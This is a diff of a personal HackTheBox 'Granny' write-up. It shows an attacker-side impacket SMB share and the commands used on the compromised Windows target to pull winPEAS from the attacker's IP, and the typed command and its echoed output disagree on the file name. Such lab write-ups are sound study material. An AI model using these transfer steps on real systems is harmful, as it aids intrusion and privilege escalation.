@@ -6,7 +6,7 @@ Level: Easy
 3. davtest - Command line utility to check if you're allowed to upload file using PUT/Move Method. Uploads random files 
 4. local_exploit_Suggester.
 5. winPEAS.bat transfer to target. 
-6. Python to start the FTP server
+6. Python to start the FTP Server
 
 
 Following HTTP Methods were supported
@@ -85,11 +85,30 @@ At one point, I was struggling with transferring the winPEAS.exe (EXE File) onto
 
 ```
 On my kali
+==========
 impacket-smbserver a /home/ringbuffer/Downloads/Granny.htb 
 
 On the target
-c:\windows\temp>copy \\10.10.16.5\a\winPEAS.exe c:\windows\temp  #This might be the wrong format of the command. Because I note it down after I closed the tab :P
+=============
+C:\windows\temp>net use \\10.10.16.5\a
+net use \\10.10.16.5\a
+The command completed successfully.
+
+C:\windows\temp>net use
+net use
+New connections will be remembered.
+
+Status       Local     Remote                    Network
+-------------------------------------------------------------------------------
+OK                     \\10.10.16.5\a            Microsoft Windows Network
+The command completed successfully.
+
+C:\windows\temp>copy \\10.10.16.5\a\winPEAS.exe c:\windows\temp\winPEAS.bat
+copy \\10.10.16.5\a\winPEAS.bat c:\windows\temp\winPEAS.bat
+        1 file(s) copied.
+
 ```
+
 
 I used the python FTP server as well. The python's pyftpdlib library was used.
 
